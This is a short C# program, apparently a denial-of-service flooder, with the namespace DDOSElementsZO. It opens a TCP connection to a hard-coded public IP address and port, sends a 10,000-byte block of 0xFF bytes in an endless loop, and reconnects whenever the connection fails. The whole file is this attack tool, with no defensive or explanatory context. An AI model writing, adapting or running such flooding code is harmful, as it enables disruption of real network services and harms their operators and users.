using SimpleTCP;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DDOSElementsZO
{
    class Program
    {
        private static byte[] Data { get; set; }
        static void Main(string[] args)
        {
            Data = Enumerable.Range(0, 10000).Select(x => Convert.ToByte(255)).ToArray();
            var Client = new SimpleTcpClient();
            Client.DataReceived += Client_DataReceived;
            Client.Connect("51.79.145.33", 37955);
            while (true)
            {
                try
                {
                    Client.Write(Data);
                    Console.Write("SEND - ");
                }
                catch (Exception ex)
                {
                    Console.Write(ex.Message);
                    Client = new SimpleTcpClient();
                    Client.DataReceived += Client_DataReceived;
                    Client.Connect("51.79.145.33", 37955);
                }
            }
        }

        private static void Client_DataReceived(object sender, Message e)
        {
            Data = e.Data;
            Console.WriteLine("[RECIEVED]");
        }
    }
}
